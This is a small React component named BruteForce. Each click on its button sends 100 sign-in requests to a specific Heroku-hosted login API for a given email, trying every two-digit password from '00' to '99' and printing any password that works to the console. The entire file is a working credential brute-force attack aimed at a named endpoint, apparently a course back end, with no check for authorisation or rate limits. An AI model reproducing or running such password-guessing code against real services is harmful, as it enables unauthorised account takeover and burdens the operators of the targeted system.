import React from 'react';

function fetchPass(password,email){
    fetch('https://tms-js-pro-back-end.herokuapp.com/api/users/signin', {
        method: 'POST',
        headers: {
            Accept: 'application/json',
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            email,
            password,
        }),
    }).then((response) => {
        if (response.ok) {
            console.log('YOUR PASSWORD: ', password);
        }
        throw Error;
    }).catch((error)=>{
        console.log('err',error);
    })
}

const BruteForce = ({...props}) => {
    const EMAIL = props.email;
    return (
        <button type="button" onClick={()=>{
            for (let index = 0; index < 100; index += 1) {
                const correctPassword = index.toString().padStart(2, 0);
                fetchPass(correctPassword, EMAIL);
            }
        }}>
            Click for get Pass in console
        </button>
    )
};

export default BruteForce;